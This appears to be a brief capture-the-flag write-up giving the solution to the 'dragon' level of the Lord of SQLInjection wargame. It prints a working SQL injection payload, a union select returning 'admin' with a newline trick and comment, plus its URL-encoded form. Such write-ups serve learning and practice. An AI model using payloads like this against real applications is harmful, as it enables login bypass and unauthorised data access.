---
layout: default
title: dragon
---

# Lord of SQLInjection dragon Solution

The payload will be 
```
'
and 0 union select 'admin'--%0b
```

notice the \n between `'` and `and`

the encoded payload is `%27%0Aand%200%20union%20select%20%27admin%27--%0b`